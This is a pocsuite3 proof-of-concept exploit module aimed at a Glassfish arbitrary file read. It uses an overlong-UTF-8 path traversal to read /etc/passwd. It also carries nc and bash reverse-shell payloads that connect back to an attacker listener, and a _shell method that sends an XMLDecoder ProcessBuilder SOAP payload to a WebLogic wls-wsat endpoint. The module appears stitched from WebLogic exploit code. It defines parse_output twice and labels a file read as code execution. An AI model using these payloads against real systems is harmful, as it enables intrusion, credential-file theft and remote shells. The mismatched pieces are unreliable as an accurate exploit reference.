"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import re
from collections import OrderedDict
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = '97009'  # ssvid
    version = '3.0'
    author = ['xiaodi']
    vulDate = '2020-12-22'
    createDate = '2020-12-22'
    updateDate = '2020-12-22'
    references = ['https://www.xiaodi8.com']
    name = 'Glassfish任意文件读取漏洞'
    appPowerLink = ''
    appName = 'Glassfish'
    appVersion = '< 10.3.6'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        Glassfish任意文件读取漏洞将导致敏感数据泄露，进一步利用会造成权限丢失等安全隐患！
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": "rm -f /tmp/p;mknod /tmp/p p &amp;&amp; nc {0} {1} 0/tmp/p",
            "bash": "bash -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1",
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def get_check_payload(self, lhost, lport, random_uri):
        check_payload = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
              <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                  <java version="1.8" class="java.beans.XMLDecoder">
                    <object id="url" class="java.net.URL">
                      <string>http://{lhost}:{lport}/{random_uri}</string>
                    </object>
                    <object idref="url">
                      <void id="stream" method = "openStream" />
                    </object>
                  </java>
                </work:WorkContext>
                </soapenv:Header>
              <soapenv:Body/>
            </soapenv:Envelope>
        '''

        return check_payload.format(
            lhost=lhost, lport=lport, random_uri=random_uri)

    def _verify(self):
        result={}
        veri_url=self.url
        payload='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
        try:
            #requests.post(veri_url, data=payload, headers=headers)
            resp = requests.get(veri_url+payload)
            print(resp.status_code)
            #pattern = 'http://{0}(:{1})?/{2}'.format(check_host, check_port, random_uri)

            if resp.status_code==200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
                pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()

    def get_shell_payload(self, cmd_base, cmd_opt, cmd_payload):
        shell_payload = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
              <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                  <java>
                    <object class="java.lang.ProcessBuilder">
                      <array class="java.lang.String" length="3" >
                        <void index="0">
                          <string>{cmd_base}</string>
                        </void>
                        <void index="1">
                          <string>{cmd_opt}</string>
                        </void>
                        <void index="2">
                          <string>{cmd_payload}</string>
                        </void>
                      </array>
                      <void method="start"/>
                    </object>
                  </java>
                </work:WorkContext>
              </soapenv:Header>
              <soapenv:Body/>
            </soapenv:Envelope>
        '''
        return shell_payload.format(cmd_base=cmd_base, cmd_opt=cmd_opt,
                                    cmd_payload=cmd_payload)

    def _shell(self):
        vul_url = urljoin(self.url, '/wls-wsat/CoordinatorPortType')
        cmd = 'bash -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'.format(
            get_listener_ip(), get_listener_port())
        shell_payload = self.get_shell_payload('/bin/bash', '-c', cmd)
        headers = {
            "Content-Type": "text/xml;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
        }

        try:
            requests.post(vul_url, data=shell_payload, headers=headers)
        except Exception as e:
            logger.warn(str(e))

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
